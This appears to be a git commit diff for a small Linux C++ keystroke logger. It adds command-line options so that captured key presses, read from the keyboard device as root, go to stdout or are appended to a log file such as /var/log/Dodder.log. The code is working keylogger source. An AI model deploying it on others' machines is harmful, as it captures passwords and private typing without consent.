8b3d38afc26cf7b9f6855c69f4ec4c803c5d2fd1
Nimit Bhardwaj <nimitbhardwaj@gmail.com>
2017-02-03 22:34:11 +0530

    Add support for parsing arguments

--- Makefile
+++ Makefile
@@ -2,7 +2,7 @@ all:
 	cd lib/getoptpp && make
 	g++ -Wall -std=c++11 -I. main.cpp -c
 	g++ -Wall -std=c++11 -I. keyname.cpp -c
-	g++ -Wall -std=c++11 -o Logger main.o keyname.o
+	g++ -Wall -std=c++11 -o Logger main.o keyname.o -L lib/getoptpp/bin/ -lgetoptpp
 clean:
 	rm main.o keyname.o Logger
 	cd lib/getoptpp && make clean
--- main.cpp
+++ main.cpp
@@ -7,11 +7,14 @@
 
 //C++ based libraries
 #include <iostream>
+#include <fstream>
 #include <stdexcept>
+#include <string>
 
 //my libraries
 #include <keyname.h>
 #include <util.h>
+#include <lib/getoptpp/include/getopt_pp.h>
 
 //type definations
  
@@ -21,13 +24,41 @@ static const char *getKeyboardFile(void) noexcept;
 static int openKeyboardFile(void);
 
 //main
-int main()
+int main(int argc, char **argv)
 {
     int kbd_Fd;
+
     input_event eve;
     checkRoot();
     kbd_Fd = openKeyboardFile();
+
+    GetOpt::GetOpt_pp args(argc, argv);
+
     bool shiftPressed = false, capsActive = false;
+    bool isStdOut = false, isFile = false;
+
+    std::string path = "/var/log/Dodder.log";
+    std::string keyWord;
+
+    std::fstream fleObj;
+
+    if(args >> GetOpt::OptionPresent('s', "stdout"))
+        isStdOut = true;
+
+    if(args >> GetOpt::OptionPresent('f', "file"))
+    {
+        isFile = true;
+        args >> GetOpt::Option('f', "file", path, "/var/log/Dodder.log");
+    }
+    else
+        isFile = isStdOut == false ? true : false;
+
+    if(isFile)
+        fleObj.open(path, std::ios::app | std::ios::ate);
+
+    if(!fleObj.is_open() && isFile)
+        throw std::runtime_error("Error while opening the given log file");
+
     while(read(kbd_Fd, &eve, sizeof(input_event)) > 0)
     {
         if(eve.type == EV_KEY)
@@ -39,12 +70,18 @@ int main()
             if(eve.value == KEY_RELEASE && isShift(eve.code))
                 shiftPressed = false;
             if(eve.value == KEY_PRESS)
-                std::cout << getKey(eve.code, shiftPressed, capsActive) << std::endl;
+                //std::cout << getKey(eve.code, shiftPressed, capsActive) << std::endl;
+                keyWord = std::string(getKey(eve.code, shiftPressed, capsActive));
         }
         if(eve.type == EV_KEY && eve.code == 1)
             break;
+        if(isStdOut && eve.value == KEY_PRESS && eve.type == EV_KEY)
+            std::cout << keyWord << std::endl;
+        if(isFile && eve.value == KEY_PRESS && eve.type == EV_KEY)
+            fleObj << keyWord;
     }
     close(kbd_Fd);
+    fleObj.close();
     return 0;
 }
 /**
